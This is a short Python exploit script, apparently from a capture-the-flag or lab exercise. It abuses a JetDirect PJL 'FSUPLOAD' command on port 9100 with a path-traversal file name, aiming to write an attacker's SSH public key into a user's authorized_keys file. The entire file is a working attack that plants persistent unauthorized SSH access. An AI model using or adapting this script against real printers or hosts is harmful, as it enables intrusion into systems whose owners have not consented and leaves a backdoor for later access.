#!/usr/bin/env python3
"""Upload Kali pubkey to archivist authorized_keys via jetdirect PJL."""
import socket

HOST, PORT = "127.0.0.1", 9100
KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
NAME = "../.ssh/authorized_keys"
hdr = f'@PJL FSUPLOAD NAME="{NAME}" SIZE={len(KEY)}\r\n'.encode()

s = socket.socket()
s.settimeout(5)
s.connect((HOST, PORT))
s.sendall(hdr + KEY)
try:
    print(s.recv(4096))
except socket.timeout:
    print(b"(no response)")
s.close()